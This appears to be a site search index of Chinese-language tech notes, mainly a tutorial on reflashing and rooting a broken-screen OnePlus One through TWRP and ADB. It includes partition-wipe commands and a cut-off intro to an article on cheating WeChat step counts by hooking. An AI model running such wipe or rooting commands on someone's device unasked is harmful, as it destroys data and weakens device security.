error) { if (result) { NSLog(@\"%hhd\", result); NSLog(@\"%@\", [userInfo uid]); NSLog(@\"%@\", [userInfo nickname]); NSLog(@\"%@\", [userInfo profileImage]); //\u5728\u8fd9\u91cc\u628a\u62ff\u5230\u7684userInfo\u91cc\u9762\u7684\u503c\u505a\u5904\u7406\uff0c\u5b58\u670d\u52a1\u5668\u6216\u8005\u4ec0\u4e48\u7684 UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@\"Hello\" message:@\"\u6b22\u8fce\u6ce8\u518c\" delegate:nil cancelButtonTitle:@\"\u77e5\u9053\u4e86\" otherButtonTitles: nil]; [alertView show]; } else { UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@\"Hello\" message:@\"\u6b22\u8fce\u56de\u6765\" delegate:nil cancelButtonTitle:@\"\u77e5\u9053\u4e86\" otherButtonTitles:nil]; [alertView show]; } }]; } \u5230\u8fd9\u91cc\u7b2c\u4e09\u65b9\u767b\u5f55\u5c31\u7b97\u662f\u505a\u597d\u4e86\u3002 \u6700\u540e\uff0c\u9000\u51fa\u767b\u5f55\u6388\u6743\u4f7f\u7528\u4e00\u4e0b\u4ee3\u7801\u3002 [ShareSDK cancelAuthWithType:ShareTypeQQSpace]; //\u8fd9\u91cc\u4ee5QQ\u4e3a\u4f8b\u4e86 \u603b\u7ed3\uff0c\u6574\u4e2a\u8fc7\u7a0b\u6765\u770b\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\uff0c\u4f46\u8ba9\u4eba\u611f\u5230\u56f0\u96be\u7684\u539f\u56e0\u5c31\u662f\u8fd9\u4e9b\u5e73\u53f0\u63d0\u4f9b\u7684\u6587\u6863\u95ee\u9898\uff0c\u4e0d\u6e05\u6670\uff0c\u4e0d\u8bf4\u660e\u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u6d6a\u8d39\u5f88\u591a\u65f6\u95f4\u53bb\u7406\u89e3\u8fd9\u4e9b\u6587\u6863\u3002\u6211\u5f3a\u538b\u6012\u706b\u7684\u5728\u5fc3\u4e2d\u558a\u4e00\u53e5\uff1a\u64cd\u3002\u7136\u540e\u63a5\u7740\u57cb\u5934\u5199\u4ee3\u7801\u4e86\u3002 \u4e0b\u7bc7\u89c1\uff5e \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/e374732f54f0","title":"10.\u5199\u767b\u5f55\u4ee3\u7801\u3002\uff08\u8fd9\u91cc\u5728ShareSDK\u7684\u6587\u6863\u91cc\uff0c\u53c8\u6709\u4e00\u4e2a\u5751\uff09"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/","text":"\u76ee\u7684\uff1a\u83b7\u53d6\u4e00\u4e2a\u53ef\u8fd0\u884c\u7684\u5f00\u6e90Android10\u73af\u5883 \u73af\u5883\uff1a\u4e00\u52a0\u4e00\uff08OnePlus One \uff09\u624b\u673a\uff1bLineageOS 17\u7248\u672c\uff1b\u624b\u673a\u4e0b\u534a\u90e8\u5206\u89e6\u5c4f\u65e0\u54cd\u5e94 1\u3001\u7f51\u7edc\u641c\u7d22\u201ctwrp \u5c4f\u5e55\u574f\u201d\uff0c\u83b7\u5f97\u5982\u4e0b\u547d\u4ee4\uff1a https://github.com/xiongyihui/notes/issues/11 \u8fd8\u597dAndroid\u53ef\u4ee5\u66ff\u6362recovery\uff0c\u800c TWRP\u521a\u597d\u662f\u4e2a\u529f\u80fd\u5f88\u5f3a\u5927\u7684recovery \uff0c\u53ef\u4ee5\u4e0d\u7528\u89e6\u6478\u5c4f\u5e55\u5b8c\u6210\u6587\u4ef6\u62f7\u8d1d\u3001\u5237\u673a\u7b49\u529f\u80fd\u3002 \u5728TWRP\u4e0a\u4e0b\u8f7dNexus 4\u7684recovery \uff0c\u7136\u540e\u901a\u8fc7 TWRP\u7684Commandline \u628aAndroid\u7684ADB\u5f00\u542f\uff0c\u5e76\u4e14\u628aPC\u4e0a\u7684 ~/.android/adbkey.pub \u4e0a\u4f20\u5230Android\u4e0a\u3002 TWRP\u652f\u6301ADB\uff0c\u8fd0\u884cTWRP\u547d\u4ee4\u5982\u4e0b\uff1a adb shell twrp remountrw adb push file.zip /sdcard adb shell twrp install /sdcard/file.zip \u914d\u7f6eADB\uff0c\u53ef\u4ee5\u53c2\u8003 https://gist.github.com/varhub/7b9555cdd1e5ad785ffde2300fcfd0bd \u914d\u7f6eADB\uff0c\u5907\u4efd Android - Enable ADB from recovery 2\u3001\u4e0b\u8f7dbacon\u6700\u65b0\u7248LineageOS https://download.lineageos.org/bacon \u9875\u9762\u6709\u5bf9\u5e94\u7684\u5b89\u88c5wiki\uff1a https://wiki.lineageos.org/devices/bacon/install \u6b64\u5904\u6211\u4e0b\u8f7d\u7684\u662f lineage-17.1-20210311-nightly-bacon-signed.zip 3\u3001\u5237\u5165 lineage-17.1 \uff1a \u6267\u884c\u547d\u4ee4\uff1a adb reboot recovery #\u8fdb\u5165twrp\u73af\u5883 adb push lineage-17.1-20210311-nightly-bacon-signed.zip /sdcard/0/ #\u63a8\u5165\u5347\u7ea7\u5305 adb shell twrp install /sdcard/0/ lineage-17.1-20210311-nightly-bacon-signed.zip #\u5237\u5165\u5347\u7ea7\u5305 4\u3001\u6548\u679c\uff1a~~\u91cd\u542f\u5230twrp\u754c\u9762~~ 5\u3001\u641c\u7d22\u5237\u673a\u8fc7\u7a0b\uff1a Backup everything to the PC, so you will need to copy all your data over. Sync all your accounts, etc. In TWRP format data. Reboot recovery Factory Reset. Flash Lineage Flash TWRP Installer Reboot to Recovery Flash Lineage (This is only the first time, to get the *** rom on both slots, only do this for the first install) Flash TWRP Installer (This is only the first time, to get the *** rom on both slots, only do this for the first install) Reboot to Recovery (This is only the first time, to get the *** rom on both slots, only do this for the first install) Flash Gapps Flash Magisk Reboot to System. Then you should be able to setup the device, copy everything back over. Restore your data. \u6839\u636e\u4e0a\u8ff0\u63cf\u8ff0\uff1a \u5907\u4efddata \u540c\u6b65\u8d26\u53f7 TWRP\u683c\u5f0f\u5316\u624b\u673a\uff0c\u91cd\u542f\u5230recovery \u3002\u3002\u3002 \u5237\u5165LineageOS \u5237\u5165TWRP\u5b89\u88c5\u5668 \u91cd\u542f\u5230Recovery \u5237\u5165Gapps \u5237\u8ba9Magisk \u91cd\u542f\u7cfb\u7edf 6\u3001\u64cd\u4f5c\uff1a E:\\OnePlus>adb shell twrp TWRP openrecoveryscript command line tool, TWRP version 3.2.1-0 Allows command line usage of TWRP via openrecoveryscript commands. Some common commands include: install /path/to/update.zip backup <SDCRBAEM> [backupname] restore <SDCRBAEM> [backupname] wipe <partition name> sideload set <variable> [value] decrypt <password> remountrw See more documentation at https://twrp.me/faq/openrecoveryscript.html E:\\OnePlus>adb shell twrp wipe data Wiping data without wiping /data/media ... Done. Formatting Cache using make_ext4fs... Done processing script file E:\\OnePlus>adb shell twrp wipe system Formatting System using make_ext4fs... Done processing script file E:\\OnePlus>adb shell twrp install /sdcard/0/lineage-17.1-20210311-nightly-bacon-signed.zip Installing zip file '/sdcard/0/lineage-17.1-20210311-nightly-bacon-signed.zip' Checking for Digest file... Skipping Digest check: no Digest file found Warning: No file_contextsComparing TZ version TZ.BF.2.0-2.0.0109 to TZ.BF.2.0-2.0.0123Comparing TZ version TZ.BF.2.0-2.0.0123 to TZ.BF.2.0-2.0.0123Target: oneplus/bacon/A0001:5.0.2/LRX22G/YNG1TAS0YL:user/release-keysPatching system image unconditionally...script succeeded: result was [1.000000]Done processing script file \u6b64\u65f6\u8fdb\u5165LineageOS\u5f00\u673a\u5411\u5bfc\uff08SetupWizard\uff09\u754c\u9762\uff0c\u4f46\u662f\u6ca1\u6709root\uff0c\u8fde\u63a5\u4e0d\u4e86\u8bbe\u5907\u3002\u6309\u952ePower + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf\u8fdb\u5165Recovery\u6a21\u5f0f\uff08TWRP\u754c\u9762\uff09\uff1a \u4e0b\u8f7dMagisk\u5237\u5165root\uff0c\u5237\u5165Open_gapps: \u6839\u636e https://github.com/topjohnwu/Magisk/releases/ \u53ca https://www.didgeridoohan.com/magisk/HomePage \u4e0b\u8f7d Magisk-v22.0.apk \u6839\u636e https://wiki.lineageos.org/gapps.html \u4e0b\u8f7d https://opengapps.org/?api=10.0&variant=nano E:\\OnePlus>adb shell twrp install /sdcard/0/open_gapps-arm-10.0-nano-20210314.zip Installing zip file '/sdcard/0/open_gapps-arm-10.0-nano-20210314.zip' Checking for Digest file... Skipping Digest check: no Digest file found ############################## _____ _____ ___ ____ / _ \\ | __ \\ / _ \\ | _ \\ | / \\ || |__) | |_| || | \\ \\ | | | || ___/| __/ | | | | | \\ / || | \\ |__ | | | | \\_/ \\_/ |_| \\___| |_| |_| ___ _ ___ ___ ___ / __| /_\\ | _ \\ _ \\/ __| | (_ |/ _ \\| _/ _/\\__ \\ \\___/_/ \\_\\_| |_| |___/ ############################## Open GApps nano 10.0 - 20210314 - Mounting partitions - Gathering device & ROM information - Performing system space calculations - Removing existing/obsolete Apps - Installing core GApps - Installing swypelibs - Installing batteryusage - Installing calsync - Installing dialerframework - Installing googletts - Installing markup - Installing packageinstallergoogle - Installing search - Installing soundpicker - Installing speech - Installing wellbeing - Miscellaneous tasks - Copying Log to /sdcard/0 - Installation complete! - Unmounting partitions Done processing script file E:\\OnePlus>adb push Magisk-v22.0.zip /sdcard/0/ Magisk-v22.0.zip: 1 file pushed, 0 skipped. 4.0 MB/s (7513409 bytes in 1.797s) E:\\OnePlus>adb shell twrp install /sdcard/0/Magisk-v22.0.zip Installing zip file '/sdcard/0/Magisk-v22.0.zip' Checking for Digest file... Skipping Digest check: no Digest file found *********************** Magisk 22.0 Installer *********************** - Device is system-as-root - Mounting /apex/com.android.conscrypt - Mounting /apex/com.android.media - Mounting /apex/com.android.media.swcodec - Mounting /apex/com.android.resolv - Mounting /apex/com.android.runtime - Mounting /apex/com.android.tzdata - System-as-root, keep dm/avb-verity - Target image: /dev/block/mmcblk0p7 - Device platform: arm - Constructing environment - Adding addon.d survival script - Unpacking boot image - Checking ramdisk status - Stock boot image detected - Patching ramdisk - Repacking boot image - Flashing new boot image - Unmounting partitions - Done Done processing script file ~~\u5f00\u673a\u5411\u5bfc\u754c\u9762\u6ca1\u6709\u8fde\u4e0aadb\uff0c\u4e14\u4e0d\u80fd\u8df3\u8fc7~~ 7\u3001\u79fb\u9664 SUW\uff08 \u5f00\u673a\u5411\u5bfc \uff09 \u6309\u952e\uff08 Power + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf \uff09\u8fdb\u5165TWRP\uff08Recovery\u6a21\u5f0f\uff09 #\u6267\u884c\u547d\u4ee4\uff1aadb shell\u8fdb\u5165\u624b\u673a\u7684\u547d\u4ee4\u6a21\u5f0f mount system #\u6302\u8f7dsystem\u5206\u533a\u5230/system\u76ee\u5f55 mv /system/system/priv-app/SetupWizard/ /sdcard/ mv /system/system/priv-app/LineageSetupWizard/ /sdcard/ \u91cd\u542f\u540e\u8fdb\u5165\u684c\u9762\uff0c\u6b64\u65f6\u6253\u4e0d\u5f00\u8bbe\u7f6e\uff0c\u8fde\u4e0d\u4e0aWIFI\u3001\u84dd\u7259\u3002\u4f46\u662f\u53ef\u4ee5 \u8bbe\u7f6e\u5c4f\u5e55\u65cb\u8f6c \u3002 8\u3001\u6062\u590dSUW \uff08 \u5f00\u673a\u5411\u5bfc \uff09 \uff1a \u6309\u952e\uff08 Power + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf \uff09\u8fdb\u5165TWRP\uff08Recovery\u6a21\u5f0f\uff09 \u6267\u884c\u547d\u4ee4\uff1aadb shell\u8fdb\u5165\u624b\u673a\u7684\u547d\u4ee4\u6a21\u5f0f mount system #\u6302\u8f7dsystem\u5206\u533a\u5230/system\u76ee\u5f55 mv /sdcard/SetupWizard/ /system/system/priv-app/ mv /sdcard/LineageSetupWizard/ /system/system/priv-app/ \u91cd\u542f\u540e\u8fdb\u5165\u5f00\u673a\u5411\u5bfc\uff0c\u6b64\u65f6\u53ef\u4ee5\u65cb\u8f6c\u5c4f\u5e55\u3002 9\u3001 SUW\u754c\u9762\uff0c\u901a\u8fc7\u65cb\u8f6c\u5c4f\u5e55\uff0c \u8fde\u63a5WIFI\u754c\u9762\u8df3\u8fc7 \uff0c\u8d70\u5b8c\u6240\u6709\u70b9\u51fb\u3002 10\u3001\u8fdb\u5165\u6b63\u5e38\u754c\u9762\uff0c\u901a\u8fc7\u8bbe\u7f6e\uff0c\u6253\u5f00\u5f00\u53d1\u8005\u9009\u9879\uff0c\u901a\u8fc7scrcpy\u8fde\u63a5\u624b\u673a\u64cd\u4f5c\u3002 \u53c2\u8003 https://github.com/Genymobile/scrcpy/issues/1443 \uff1a scrcpy --max-size 1024 --bit-rate 15M --max-fps 30 --render-driver=opengl \u5e76\u505c\u7528\u52a8\u753b\u6548\u679c: \u8bbe\u7f6e>\u5f00\u53d1\u8005\u9009\u9879\uff0c\u627e\u5230Window animation scale, Transition animation scale, and Animator duration scale. \u4ece\u9ed8\u8ba4\u7684x1\u6539\u6210off 11\u3001\u8fde\u63a5WIFI\uff0c\u5b89\u88c5\u79d1\u5b66\u4e0a\u7f51APK\uff0c\u70b9\u51fb\u684c\u9762\u4e0a\u7684Magisk\uff0c\u5b89\u88c5ROOT 12\u3001\u6548\u679c\uff1a \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/03/16/\u5c4f\u5e55\u574f\u4e00\u52a0\u624b\u673a\u5237android10/","title":"\u5c4f\u5e55\u574f\u4e00\u52a0\u624b\u673a\u5237android10"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#android10","text":"","title":"\u76ee\u7684\uff1a\u83b7\u53d6\u4e00\u4e2a\u53ef\u8fd0\u884c\u7684\u5f00\u6e90Android10\u73af\u5883"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#oneplus-one-lineageos-17","text":"","title":"\u73af\u5883\uff1a\u4e00\u52a0\u4e00\uff08OnePlus One \uff09\u624b\u673a\uff1bLineageOS 17\u7248\u672c\uff1b\u624b\u673a\u4e0b\u534a\u90e8\u5206\u89e6\u5c4f\u65e0\u54cd\u5e94"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#1twrp","text":"https://github.com/xiongyihui/notes/issues/11 \u8fd8\u597dAndroid\u53ef\u4ee5\u66ff\u6362recovery\uff0c\u800c TWRP\u521a\u597d\u662f\u4e2a\u529f\u80fd\u5f88\u5f3a\u5927\u7684recovery \uff0c\u53ef\u4ee5\u4e0d\u7528\u89e6\u6478\u5c4f\u5e55\u5b8c\u6210\u6587\u4ef6\u62f7\u8d1d\u3001\u5237\u673a\u7b49\u529f\u80fd\u3002 \u5728TWRP\u4e0a\u4e0b\u8f7dNexus 4\u7684recovery \uff0c\u7136\u540e\u901a\u8fc7 TWRP\u7684Commandline \u628aAndroid\u7684ADB\u5f00\u542f\uff0c\u5e76\u4e14\u628aPC\u4e0a\u7684 ~/.android/adbkey.pub \u4e0a\u4f20\u5230Android\u4e0a\u3002 TWRP\u652f\u6301ADB\uff0c\u8fd0\u884cTWRP\u547d\u4ee4\u5982\u4e0b\uff1a adb shell twrp remountrw adb push file.zip /sdcard adb shell twrp install /sdcard/file.zip \u914d\u7f6eADB\uff0c\u53ef\u4ee5\u53c2\u8003 https://gist.github.com/varhub/7b9555cdd1e5ad785ffde2300fcfd0bd \u914d\u7f6eADB\uff0c\u5907\u4efd Android - Enable ADB from recovery","title":"1\u3001\u7f51\u7edc\u641c\u7d22\u201ctwrp \u5c4f\u5e55\u574f\u201d\uff0c\u83b7\u5f97\u5982\u4e0b\u547d\u4ee4\uff1a"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#2baconlineageos","text":"https://download.lineageos.org/bacon \u9875\u9762\u6709\u5bf9\u5e94\u7684\u5b89\u88c5wiki\uff1a https://wiki.lineageos.org/devices/bacon/install \u6b64\u5904\u6211\u4e0b\u8f7d\u7684\u662f lineage-17.1-20210311-nightly-bacon-signed.zip","title":"2\u3001\u4e0b\u8f7dbacon\u6700\u65b0\u7248LineageOS"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#3-lineage-171","text":"\u6267\u884c\u547d\u4ee4\uff1a adb reboot recovery #\u8fdb\u5165twrp\u73af\u5883 adb push lineage-17.1-20210311-nightly-bacon-signed.zip /sdcard/0/ #\u63a8\u5165\u5347\u7ea7\u5305 adb shell twrp install /sdcard/0/ lineage-17.1-20210311-nightly-bacon-signed.zip #\u5237\u5165\u5347\u7ea7\u5305","title":"3\u3001\u5237\u5165 lineage-17.1 \uff1a"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#4twrp","text":"","title":"4\u3001\u6548\u679c\uff1a~~\u91cd\u542f\u5230twrp\u754c\u9762~~"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#5","text":"Backup everything to the PC, so you will need to copy all your data over. Sync all your accounts, etc. In TWRP format data. Reboot recovery Factory Reset. Flash Lineage Flash TWRP Installer Reboot to Recovery Flash Lineage (This is only the first time, to get the *** rom on both slots, only do this for the first install) Flash TWRP Installer (This is only the first time, to get the *** rom on both slots, only do this for the first install) Reboot to Recovery (This is only the first time, to get the *** rom on both slots, only do this for the first install) Flash Gapps Flash Magisk Reboot to System. Then you should be able to setup the device, copy everything back over. Restore your data. \u6839\u636e\u4e0a\u8ff0\u63cf\u8ff0\uff1a \u5907\u4efddata \u540c\u6b65\u8d26\u53f7 TWRP\u683c\u5f0f\u5316\u624b\u673a\uff0c\u91cd\u542f\u5230recovery \u3002\u3002\u3002 \u5237\u5165LineageOS \u5237\u5165TWRP\u5b89\u88c5\u5668 \u91cd\u542f\u5230Recovery \u5237\u5165Gapps \u5237\u8ba9Magisk \u91cd\u542f\u7cfb\u7edf","title":"5\u3001\u641c\u7d22\u5237\u673a\u8fc7\u7a0b\uff1a"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#6","text":"E:\\OnePlus>adb shell twrp TWRP openrecoveryscript command line tool, TWRP version 3.2.1-0 Allows command line usage of TWRP via openrecoveryscript commands. Some common commands include: install /path/to/update.zip backup <SDCRBAEM> [backupname] restore <SDCRBAEM> [backupname] wipe <partition name> sideload set <variable> [value] decrypt <password> remountrw See more documentation at https://twrp.me/faq/openrecoveryscript.html E:\\OnePlus>adb shell twrp wipe data Wiping data without wiping /data/media ... Done. Formatting Cache using make_ext4fs... Done processing script file E:\\OnePlus>adb shell twrp wipe system Formatting System using make_ext4fs... Done processing script file E:\\OnePlus>adb shell twrp install /sdcard/0/lineage-17.1-20210311-nightly-bacon-signed.zip Installing zip file '/sdcard/0/lineage-17.1-20210311-nightly-bacon-signed.zip' Checking for Digest file... Skipping Digest check: no Digest file found Warning: No file_contextsComparing TZ version TZ.BF.2.0-2.0.0109 to TZ.BF.2.0-2.0.0123Comparing TZ version TZ.BF.2.0-2.0.0123 to TZ.BF.2.0-2.0.0123Target: oneplus/bacon/A0001:5.0.2/LRX22G/YNG1TAS0YL:user/release-keysPatching system image unconditionally...script succeeded: result was [1.000000]Done processing script file \u6b64\u65f6\u8fdb\u5165LineageOS\u5f00\u673a\u5411\u5bfc\uff08SetupWizard\uff09\u754c\u9762\uff0c\u4f46\u662f\u6ca1\u6709root\uff0c\u8fde\u63a5\u4e0d\u4e86\u8bbe\u5907\u3002\u6309\u952ePower + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf\u8fdb\u5165Recovery\u6a21\u5f0f\uff08TWRP\u754c\u9762\uff09\uff1a \u4e0b\u8f7dMagisk\u5237\u5165root\uff0c\u5237\u5165Open_gapps: \u6839\u636e https://github.com/topjohnwu/Magisk/releases/ \u53ca https://www.didgeridoohan.com/magisk/HomePage \u4e0b\u8f7d Magisk-v22.0.apk \u6839\u636e https://wiki.lineageos.org/gapps.html \u4e0b\u8f7d https://opengapps.org/?api=10.0&variant=nano E:\\OnePlus>adb shell twrp install /sdcard/0/open_gapps-arm-10.0-nano-20210314.zip Installing zip file '/sdcard/0/open_gapps-arm-10.0-nano-20210314.zip' Checking for Digest file... Skipping Digest check: no Digest file found ############################## _____ _____ ___ ____ / _ \\ | __ \\ / _ \\ | _ \\ | / \\ || |__) | |_| || | \\ \\ | | | || ___/| __/ | | | | | \\ / || | \\ |__ | | | | \\_/ \\_/ |_| \\___| |_| |_| ___ _ ___ ___ ___ / __| /_\\ | _ \\ _ \\/ __| | (_ |/ _ \\| _/ _/\\__ \\ \\___/_/ \\_\\_| |_| |___/ ############################## Open GApps nano 10.0 - 20210314 - Mounting partitions - Gathering device & ROM information - Performing system space calculations - Removing existing/obsolete Apps - Installing core GApps - Installing swypelibs - Installing batteryusage - Installing calsync - Installing dialerframework - Installing googletts - Installing markup - Installing packageinstallergoogle - Installing search - Installing soundpicker - Installing speech - Installing wellbeing - Miscellaneous tasks - Copying Log to /sdcard/0 - Installation complete! - Unmounting partitions Done processing script file E:\\OnePlus>adb push Magisk-v22.0.zip /sdcard/0/ Magisk-v22.0.zip: 1 file pushed, 0 skipped. 4.0 MB/s (7513409 bytes in 1.797s) E:\\OnePlus>adb shell twrp install /sdcard/0/Magisk-v22.0.zip Installing zip file '/sdcard/0/Magisk-v22.0.zip' Checking for Digest file... Skipping Digest check: no Digest file found *********************** Magisk 22.0 Installer *********************** - Device is system-as-root - Mounting /apex/com.android.conscrypt - Mounting /apex/com.android.media - Mounting /apex/com.android.media.swcodec - Mounting /apex/com.android.resolv - Mounting /apex/com.android.runtime - Mounting /apex/com.android.tzdata - System-as-root, keep dm/avb-verity - Target image: /dev/block/mmcblk0p7 - Device platform: arm - Constructing environment - Adding addon.d survival script - Unpacking boot image - Checking ramdisk status - Stock boot image detected - Patching ramdisk - Repacking boot image - Flashing new boot image - Unmounting partitions - Done Done processing script file ~~\u5f00\u673a\u5411\u5bfc\u754c\u9762\u6ca1\u6709\u8fde\u4e0aadb\uff0c\u4e14\u4e0d\u80fd\u8df3\u8fc7~~","title":"6\u3001\u64cd\u4f5c\uff1a"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#7-suw","text":"\u6309\u952e\uff08 Power + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf \uff09\u8fdb\u5165TWRP\uff08Recovery\u6a21\u5f0f\uff09 #\u6267\u884c\u547d\u4ee4\uff1aadb shell\u8fdb\u5165\u624b\u673a\u7684\u547d\u4ee4\u6a21\u5f0f mount system #\u6302\u8f7dsystem\u5206\u533a\u5230/system\u76ee\u5f55 mv /system/system/priv-app/SetupWizard/ /sdcard/ mv /system/system/priv-app/LineageSetupWizard/ /sdcard/ \u91cd\u542f\u540e\u8fdb\u5165\u684c\u9762\uff0c\u6b64\u65f6\u6253\u4e0d\u5f00\u8bbe\u7f6e\uff0c\u8fde\u4e0d\u4e0aWIFI\u3001\u84dd\u7259\u3002\u4f46\u662f\u53ef\u4ee5 \u8bbe\u7f6e\u5c4f\u5e55\u65cb\u8f6c \u3002","title":"7\u3001\u79fb\u9664 SUW\uff08 \u5f00\u673a\u5411\u5bfc \uff09"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#8suw","text":"\u6309\u952e\uff08 Power + \u97f3\u91cf\u52a0 + \u97f3\u91cf\u51cf \uff09\u8fdb\u5165TWRP\uff08Recovery\u6a21\u5f0f\uff09 \u6267\u884c\u547d\u4ee4\uff1aadb shell\u8fdb\u5165\u624b\u673a\u7684\u547d\u4ee4\u6a21\u5f0f mount system #\u6302\u8f7dsystem\u5206\u533a\u5230/system\u76ee\u5f55 mv /sdcard/SetupWizard/ /system/system/priv-app/ mv /sdcard/LineageSetupWizard/ /system/system/priv-app/ \u91cd\u542f\u540e\u8fdb\u5165\u5f00\u673a\u5411\u5bfc\uff0c\u6b64\u65f6\u53ef\u4ee5\u65cb\u8f6c\u5c4f\u5e55\u3002","title":"8\u3001\u6062\u590dSUW \uff08 \u5f00\u673a\u5411\u5bfc \uff09 \uff1a"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#9-suw-wifi","text":"","title":"9\u3001 SUW\u754c\u9762\uff0c\u901a\u8fc7\u65cb\u8f6c\u5c4f\u5e55\uff0c \u8fde\u63a5WIFI\u754c\u9762\u8df3\u8fc7 \uff0c\u8d70\u5b8c\u6240\u6709\u70b9\u51fb\u3002"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#10scrcpy","text":"\u53c2\u8003 https://github.com/Genymobile/scrcpy/issues/1443 \uff1a scrcpy --max-size 1024 --bit-rate 15M --max-fps 30 --render-driver=opengl \u5e76\u505c\u7528\u52a8\u753b\u6548\u679c: \u8bbe\u7f6e>\u5f00\u53d1\u8005\u9009\u9879\uff0c\u627e\u5230Window animation scale, Transition animation scale, and Animator duration scale. \u4ece\u9ed8\u8ba4\u7684x1\u6539\u6210off","title":"10\u3001\u8fdb\u5165\u6b63\u5e38\u754c\u9762\uff0c\u901a\u8fc7\u8bbe\u7f6e\uff0c\u6253\u5f00\u5f00\u53d1\u8005\u9009\u9879\uff0c\u901a\u8fc7scrcpy\u8fde\u63a5\u624b\u673a\u64cd\u4f5c\u3002"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#11wifiapkmagiskroot","text":"","title":"11\u3001\u8fde\u63a5WIFI\uff0c\u5b89\u88c5\u79d1\u5b66\u4e0a\u7f51APK\uff0c\u70b9\u51fb\u684c\u9762\u4e0a\u7684Magisk\uff0c\u5b89\u88c5ROOT"},{"location":"Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/#12","text":"\u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/03/16/\u5c4f\u5e55\u574f\u4e00\u52a0\u624b\u673a\u5237android10/","title":"12\u3001\u6548\u679c\uff1a"},{"location":"Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/","text":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d \u2013 \u5229\u7528Android Hook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a 0x00 \u5e8f \u968f\u7740\u5e26\u534f\u5904\u7406\u5668\u548c\u4e70\u624b\u73af\u7684\u4eba\u8d8a\u6765\u8d8a\u591a,\u5fae\u4fe1\u8fd0\u52a8\u4e00\u4e0b\u5b50\u706b\u4e86,\u53ea\u8981\u4f60\u5728\u5fae\u4fe1\u5173\u6ce8\u5fae\u4fe1\u8fd0\u52a8,\u624b\u673a\u5c31\u80fd\u81ea\u52a8\u8bb0\u5f55\u4f60\u6bcf\u5929\u884c\u8d70\u7684\u6b65\u6570,\u8fd8\u53ef\u4ee5\u8ddf\u670b\u53cb\u5708\u91cc\u7684\u597d\u53cbPK\u8fd0\u52a8\u91cf\u3002\u5e76\u4e14\u6bcf\u65e5\u6392\u540d\u7b2c\u4e00\u7684\u7528\u6237\u53ef\u4ee5\u5360\u636e\u5f53\u65e5\u6392\u884c\u699c\u7684\u5c01\u9762\u3002\u8fd9\u5145\u5206\u6fc0\u8d77\u4e86\u5927\u5bb6\u7684\u6c42\u80dc\u7684\u6b32\u671b,\u4e8e\u662f\u51fa\u73b0\u4e86\u5f88\u591a\u52b1\u5fd7\u7684\u548c\u60b2\u4f24\u7684\u6545\u4e8b\u2026\u2026 0x01\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5 \u5176\u5b9e\u60f3\u8981\u62ff\u7b2c\u4e00\u6ca1\u6709\u90a3\u4e48\u9ebb\u70e6,\u53ea\u8981\u4f1a\u4e00\u70b9Android\u7684Hook\u77e5\u8bc6,\u5c31\u53ef\u4ee5\u8f7b\u677e\u51b2\u5230\u6392\u884c\u699c\u7b2c\u4e00\u540d\u3002\u63a5\u4e0b\u6765\u6211\u5c31\u624b\u628a\u624b\u6559\u4f60\u5982\u4f55\u53d8\u6210\u7b2c\u4e00\u3002 